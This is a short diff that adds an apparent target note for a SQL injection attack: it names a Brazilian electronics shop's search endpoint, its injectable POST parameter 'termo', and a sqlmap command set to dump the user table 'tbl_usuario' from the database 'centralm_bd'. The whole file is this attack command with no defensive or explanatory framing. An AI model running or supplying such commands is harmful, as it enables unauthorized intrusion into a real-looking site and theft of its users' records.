@@ -1,0 +1,3 @@
+http://www.centralmixeletronicos.com.br/busca (POST)  # sqlmap.py -u http://www.centralmixeletronicos.com.br/busca --data termo=a -D centralm_bd -T tbl_usuario --dump --threads 5 -v3
+
+termo=a
